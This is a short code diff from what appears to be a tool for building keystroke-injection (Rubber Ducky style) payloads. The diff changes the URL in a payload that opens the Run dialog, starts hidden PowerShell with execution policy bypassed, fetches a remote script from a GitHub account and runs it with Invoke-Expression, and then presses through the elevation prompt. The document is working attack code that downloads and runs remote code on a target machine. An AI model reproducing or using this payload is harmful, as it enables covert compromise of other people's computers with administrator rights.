@@ -41,7 +41,7 @@ def setup_powershell():
             star()
 
 def setup_payload():
-    payload = f'DELAY 2000\nGUI r\nDELAY 1000\nSTRING powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/{repo}/refs/heads/n/run.ps1" -UseBasicParsing).Content"\nDELAY 1000\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\n'
+    payload = f'DELAY 2000\nGUI r\nDELAY 1000\nSTRING powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SAKIB-SALIM/f/refs/heads/main/{client}.ps1" -UseBasicParsing).Content"\nDELAY 1000\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\n'
     with open('payload.dd','w') as w:
         w.write(payload)
         if debug:
